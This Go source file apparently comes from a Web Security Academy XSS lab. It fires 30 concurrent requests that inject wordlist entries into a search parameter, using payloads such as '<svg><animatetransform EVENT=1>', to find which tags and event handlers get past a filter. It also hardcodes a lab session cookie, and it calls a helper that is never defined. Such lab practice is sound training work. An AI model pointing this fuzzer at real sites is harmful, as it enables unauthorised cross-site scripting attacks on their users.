package main

import (
	"bufio"
	"fmt"
	"net/http"
	"os"
	"sync"
)

var (
	goRoutinesNum = 30
	mainUrl       = "https://0afd003804c9223e8218f7a8003e0024.h1-web-security-academy.net"
	// mainUrl       = "http://localhost:3333"
	cookieSession = "session=oop9Yz5QNdywHTK8TircC6w3L96oEEnT"
)

func main() {
	// file, err := os.Open("/home/user1/hat/web_sec_academy/xss/bf/payload/temp.txt")
	// file, err := os.Open("/home/user1/hat/web_sec_academy/xss/bf/payload/tags.txt")
	file, err := os.Open("/home/user1/hat/web_sec_academy/xss/bf/payload/events.txt")
	if err != nil {
		fmt.Println("Error:", err)
		return
	}
	defer file.Close()

	bufferedReader := bufio.NewScanner(file)

	done := false
	for done != true {
		var wg sync.WaitGroup

		for i := 0; i < goRoutinesNum; i++ {
			canMoreMore := bufferedReader.Scan()
			if !canMoreMore {
				done = true
				break
			}
			line := bufferedReader.Text()

			wg.Add(1)
			go flow(&wg, line)
		}

		wg.Wait()
	}

	if err := bufferedReader.Err(); err != nil {
		fmt.Println("Error:", err)
	}

}

func flow(wg *sync.WaitGroup, line string) {
	defer wg.Done()

	// check allowed tags
	// resp := makeHttpReq(http.MethodGet, mainUrl+"?search=%3C"+line+"%3E", "", cookieSession, true)

	// check allowed events
	// resp := makeHttpReq(http.MethodGet, mainUrl+"?search=%3Cbody%20"+line+"=1%20%3E", "", cookieSession, true)
	resp := makeHttpReq(http.MethodGet, mainUrl+"?search=<svg><animatetransform%20"+line+"=1>", "", cookieSession, true)

	defer resp.Body.Close()
	// rawHttpLikeOutput(resp, false)

	if resp.StatusCode == 200 {
		fmt.Println("(+) " + line)
	} else {
		fmt.Println("(-) " + line)
	}
}
